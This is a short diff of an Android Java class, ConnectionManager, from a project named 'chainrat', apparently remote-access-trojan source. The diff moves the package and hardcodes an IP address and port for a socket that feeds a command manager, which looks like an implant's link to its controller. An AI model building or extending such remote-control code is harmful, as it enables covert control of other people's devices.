@@ -1,10 +1,11 @@
-package com.nefi.chainrat;
+package com.nefi.chainrat.networking;
 
 import android.content.Context;
 import android.os.SystemClock;
 import android.util.Log;
 import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
+import com.nefi.chainrat.CommandManager;
 import com.nefi.chainrat.networking.Command;
 import com.nefi.chainrat.networking.IOSocket;
 import org.json.JSONObject;
@@ -14,8 +15,11 @@ import java.security.spec.ECField;
 public class ConnectionManager{
 
     private static final String TAG = "CM";
+    private static String IP = "192.168.0.238";
+    private static int port = 5545;
+
     public static Context contextOfApplication;
-    private static IOSocket socket = new IOSocket();
+    private static IOSocket socket = new IOSocket(IP, port);
     private static CommandManager cm = new CommandManager();
 
     public static void startAsync(Context con) {
@@ -58,5 +62,7 @@ public class ConnectionManager{
             throw new Exception();
         }
         */
+
+
     }
 }
